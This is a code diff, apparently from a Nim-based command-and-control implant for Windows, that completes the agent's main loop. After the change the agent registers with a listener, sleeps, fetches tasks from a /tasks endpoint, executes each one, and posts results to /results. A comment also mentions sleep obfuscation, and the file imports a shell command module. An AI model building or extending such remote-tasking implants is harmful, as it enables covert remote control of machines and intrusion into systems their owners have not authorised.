@@ -1,7 +1,7 @@
 import strformat, os, times
 import winim
 
-import ./[types, http]
+import ./[types, http, task]
 import commands/shell
 
 proc main() = 
@@ -19,7 +19,7 @@ proc main() =
     echo fmt"[+] [{agent}] Agent registered."
 
     #[
-        Infinite Routine: 
+        Agent routine: 
         1. Sleep Obfuscation
         2. Retrieve task from /tasks endpoint
         3. Execute task and post result to /results
@@ -31,10 +31,14 @@ proc main() =
         sleep(10 * 1000)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
-        echo fmt"[{date}] Checking for tasks..."
+        echo fmt"[{date}] Checking in."
 
-        discard getTasks(listener, agent)
+        let tasks: seq[Task] = getTasks(listener, agent)
 
+        for task in tasks: 
+            let result = task.handleTask()
 
+            discard postResults(listener, agent, result)
+            
 when isMainModule: 
     main() 
